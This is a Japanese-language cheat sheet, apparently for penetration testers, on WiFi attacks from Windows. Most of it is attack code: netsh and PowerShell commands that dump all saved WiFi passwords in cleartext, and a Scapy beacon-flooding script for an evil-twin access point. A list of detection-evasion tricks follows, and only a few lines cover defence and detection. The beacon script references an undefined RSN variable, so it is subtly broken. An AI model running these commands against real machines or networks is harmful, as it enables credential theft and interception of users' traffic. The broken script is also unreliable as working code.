# Windows WiFi Attack Techniques

**対応OS**: Windows

## 概要
Windows環境での無線ネットワークに対する攻撃手法について解説します。

## 基本的な手法

### ネットワークプロファイルの抽出
```powershell
# 保存済みWiFiプロファイルの一覧表示
netsh wlan show profiles

# 特定のプロファイルの詳細表示（パスワードを含む）
netsh wlan show profile name="SSID" key=clear

# PowerShellを使用したプロファイル抽出
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }}
```

### Evil Twinアタック
```python
from scapy.all import *

def create_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID="RSNinfo", info=RSN)
    frame = RadioTap()/dot11/beacon/essid/rsn
    return frame

# ビーコンフレームの送信
while True:
    sendp(create_beacon("Target_SSID", "00:11:22:33:44:55"),
          iface="wlan0", inter=0.1)
```

## 検知回避テクニック
- MACアドレスのスプーフィング
- 送信電力の調整
- チャンネルホッピング
- フレーム改変

## 防御策
- WPA3の使用
- 強力なパスワードポリシー
- ネットワーク監視
- クライアント側の保護

## 検知方法
- 不正なアクセスポイントの検出
- 異常なトラフィックパターン
- デバイスの監視
- ログ分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 